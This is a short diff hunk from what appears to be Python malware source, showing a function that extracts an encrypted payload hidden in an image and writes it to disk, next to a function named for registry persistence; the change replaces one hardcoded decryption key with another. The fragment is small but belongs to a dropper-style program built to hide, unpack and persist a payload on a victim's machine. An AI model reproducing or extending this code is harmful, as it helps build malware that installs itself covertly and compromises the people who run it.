@@ -297,7 +297,7 @@ def add_registry_persistence_user():
 def extract_payload_to_disk():
     """Extract the encrypted payload from the image and write to disk."""
     try:
-        divine_key = b'UU_M8NZdeEYmoXrsxqBAnahhXV8q95irmx9d5o8RzA4='
+        divine_key = b'qDB0fHUEEy8ym6n5lAZfy3QkcqwePvsd1kbiGHSoFP0='
 
         if hasattr(sys, 'frozen'):
             base_path = sys._MEIPASS
